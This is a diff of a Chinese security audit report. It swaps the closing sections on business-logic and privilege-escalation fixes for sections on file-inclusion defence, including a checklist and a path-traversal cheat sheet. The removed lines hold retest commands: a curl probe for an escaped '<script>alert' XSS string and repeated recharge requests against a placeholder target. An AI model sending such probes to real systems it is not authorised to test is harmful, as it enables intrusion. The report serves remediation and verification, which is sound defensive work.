-curl -s "..." | grep "&lt;script&gt;alert" || echo "已转义"
-
-# 结果：<script> 被转义为 &lt;script&gt;，不会执行
-```
-
-#### 测试 5：余额精度
-
-```bash
-# 充值 0.01 元三次
-curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"
-curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"
-curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"
-
-# 查看余额
-# 结果：100.03 元（精确），而非 100.03000000000001
-```
-
-### 9.3 验证结果汇总
-
-| 测试用例 | 修复前 | 修复后 | 通过 |
-|----------|--------|--------|------|
-| alice 查看 admin 资料 | ✅ 成功越权 | ❌ 重定向到本人 | ✅ |
-| 枚举 user_id 批量窃取 | ✅ 可批量获取 | ❌ 只能看自己 | ✅ |
-| 未登录搜索用户 | ✅ 可搜索 | ❌ 跳转登录 | ✅ |
-| 注册密码明文泄露 | ✅ 明文存储 | ❌ 哈希存储 | ✅ |
-| 控制台日志泄露密码 | ✅ 明文日志 | ❌ 打印 [HASHED] | ✅ |
-| URL msg 参数 XSS | ✅ 脚本可执行 | ❌ 自动 HTML 转义 | ✅ |
-| 余额 0.01 累加精度 | ❌ 产生误差 | ✅ 精确到分 | ✅ |
-| 余额负充值 | ✅ 可扣款 | ❌ 金额校验拦截 | ✅ |
-
----
-
-## 10. 残留风险与加固建议
+## 10. 残留风险
 
 ### 当前已覆盖的安全措施
 
 ```
-业务逻辑安全
-├── 身份认证层
-│   ├── 搜索功能 → 登录校验 ✅
-│   ├── 个人中心 → 登录校验 ✅
-│   └── 充值功能 → 登录校验 ✅
-│
-├── 权限控制层
-│   ├── 个人中心 → 水平越权防护 ✅
-│   └── 充值功能 → 从 session 取 user_id ✅
-│
-├── 数据安全层
-│   ├── 注册密码 → 哈希存储 ✅
-│   ├── 控制台日志 → 不打印明文密码 ✅
-│   └── 余额 → 整数分存储 ✅
-│
-└── 输出安全层
-    ├── 模板 → 从视图函数接收变量 ✅
-    └── URL 参数 → 不直接渲染 ✅
+文件包含防护
+├── 输入层
+│   ├── 白名单校验 ✅
+│   └── 文件名清理 ✅
+├── 路径处理层
+│   ├── 路径规范化 ✅
+│   └── 目录边界检查 ✅
+└── 文件读取层
+    ├── 文件存在性检查 ✅
+    └── 异常处理 ✅
 ```
 
-### 残留风险
+### 残留风险清单
 
-| 风险 | 等级 | 说明 | 建议 |
-|------|------|------|------|
-| 登录 session 固定 | 🟡 低危 | session 登录前后 ID 不变 | 登录时调用 `session.regenerate()` |
-| 无操作日志 | 🟡 低危 | 越权尝试无法追溯 | 添加登录/越权尝试日志 |
-| 充值无上限 | 🟡 低危 | 可无限充值 | 设置单次/每日充值上限 |
-| 批量注册 | 🟡 低危 | 可脚本批量注册 | 添加验证码机制 |
-| 手机/邮箱未脱敏 | 🟡 低危 | 页面显示完整手机号 | 显示为 `138****8000` |
+| 残留风险 | 等级 | 说明 | 建议 |
+|----------|------|------|------|
+| 白名单页面内容自身安全 | 🟡 低危 | 页面内容可能包含敏感信息 | 定期审核 pages/ 下的文件内容 |
+| 大文件读取性能 | 🟡 低危 | 大文件可能导致内存占用过高 | 设置文件大小读取限制 |
+| 文件编码问题 | 🟡 低危 | 非 UTF-8 文件可能读取失败 | 增加编码异常处理 |
+| 符号链接攻击 | 🟡 低危 | pages/ 内的符号链接可指向外部 | 使用 `realpath` 已覆盖防御 |
 
-### 安全加固路线图
+### 安全自检清单
 
-```
-第一阶段（已修复 ✅）
-├── 个人中心水平越权防护
-├── 搜索功能登录校验
-├── 注册密码哈希存储
-├── 模板 XSS 防护
-└── 余额整数分存储
-
-第二阶段（建议加固）
-├── 登录 session 重新生成
-├── 越权/异常操作日志
-├── 充值上限限制
-├── 验证码机制
-└── 敏感信息脱敏显示
-
-第三阶段（架构优化）
-├── RBAC 权限模型
-├── API 鉴权中间件
-├── 操作审计系统
-├── 全站 HTTPS
-└── 强制密码策略
-```
+- [x] 是否使用白名单限制可访问页面？
+- [x] 是否对用户输入做路径遍历过滤？
+- [x] 是否使用 `os.path.realpath()` 规范化路径？
+- [x] 是否检查最终路径是否在允许的目录内？
+- [x] 是否使用 `os.path.basename()` 提取文件名？
+- [x] 是否限制了文件扩展名？
+- [x] 是否处理了 URL 编码绕过？
+- [x] 是否设置了文件大小读取限制？
 
 ---
 
-*报告结束 | 检测模块：业务逻辑与越权漏洞 | 审核日期：2026-07-09*
+### 附录：文件包含漏洞防御速查表
+
+| 防御措施 | 实现方法 | 优先级 |
+|----------|----------|--------|
+| **白名单** | 枚举允许访问的文件名 | 🔴 必须 |
+| **路径规范化** | `os.path.realpath()` | 🔴 必须 |
+| **目录限制** | 检查路径前缀 | 🔴 必须 |
+| **文件名过滤** | `os.path.basename()` | 🟠 推荐 |
+| **扩展名限制** | 仅允许 `.html` | 🟠 推荐 |
+| **URL 解码处理** | 先解码再校验 | 🟠 推荐 |
+| **文件大小限制** | 限制读取大小 | 🟡 建议 |
+| **日志记录** | 记录异常访问 | 🟡 建议 |
+
+---
+
+*报告结束 | 检测模块：文件包含漏洞 | 检测方式：Manual Code Audit + Penetration Testing | 报告日期：2026-07-13*
